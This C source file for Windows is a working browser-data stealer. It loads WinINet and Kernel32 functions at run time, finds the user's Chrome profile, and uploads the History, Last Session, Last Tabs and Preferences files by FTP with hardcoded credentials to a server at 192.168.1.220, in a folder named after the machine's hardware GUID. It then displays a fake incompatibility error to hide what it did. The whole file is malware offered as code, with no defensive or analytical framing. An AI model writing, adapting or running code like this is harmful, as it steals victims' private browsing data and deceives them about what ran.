#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <wininet.h>

//Loads all libraries at run-time

int main() {
	typedef UINT (CALLBACK* LPFNDLLFUNC1)(DWORD,UINT);
	char *user = getenv("USERPROFILE");
	strcat(user, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
	char uuid[50];
	int retVal;
	HW_PROFILE_INFO info;
	HINSTANCE lib, klib, adlib;
	PROC open, con, ftpset, ftpcreate, ftpget, ftpput, chdir, getuuid;
	HINTERNET initial, ftp;
	int uploadRet;
	lib = LoadLibraryA("Wininet.dll");
	klib = LoadLibraryA("Kernel32.dll");
	adlib = LoadLibraryA("Advapi32.dll");
	char *files[4] = {"History", "Last Session", "Last Tabs", "Preferences"};
	WIN32_FIND_DATA location;
	if (lib == NULL) {
		printf("Problem w/LoadLibrary\n");
	}
	getuuid = (PROC)GetProcAddress(adlib, "GetCurrentHwProfileA");	
	open = (PROC)GetProcAddress(lib, "InternetOpenA");
	con = (PROC)GetProcAddress(lib, "InternetConnectA");
	ftpput = (PROC)GetProcAddress(lib, "FtpPutFileA");
	ftpget = (PROC)GetProcAddress(klib, "FindFirstFileA");
	ftpcreate = (PROC)GetProcAddress(lib, "FtpCreateDirectoryA");
	ftpset = (PROC)GetProcAddress(lib, "FtpSetCurrentDirectoryA");
	chdir = (PROC)GetProcAddress(klib, "SetCurrentDirectoryA");
	(getuuid)(&info);
	strcpy(uuid, info.szHwProfileGuid);
	(chdir)(user);
	if (open == NULL) {
		printf("Problem w/GetProcAddress\n");
		//getting the last error message
		//stolen from stackoverflow (;
		DWORD errorMessageID = GetLastError();
		LPSTR messageBuffer;
		size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
		printf("%s\n", messageBuffer);
	}
	/*you can call a function in 2 diff ways:
		1. (ProcAdd)(0,"M","M",MB_OKCANCEL);
		2. or you can do this: ProcAdd(0,"M","M",MB_OKCANCEL); 
	*/
	initial = (open)("winapi", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	ftp = (con)(initial, "192.168.1.220", INTERNET_DEFAULT_FTP_PORT, "ftpsecure", "ftpsecure", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	retVal = (ftpset)(ftp, info.szHwProfileGuid);
	if (retVal == 0) {
		(ftpcreate)(ftp, info.szHwProfileGuid);
		(ftpset)(ftp, info.szHwProfileGuid);
	}
	for (int i=0; i <= 3; i++) {
		(ftpget)(files[i], &location);
		uploadRet = (ftpput)(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);
	}
	if (uploadRet == 0){
		printf("UPLOAD FAILED, ABORT!\n");
	}
	MessageBoxA(0, "The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", "Error", MB_OK);

}
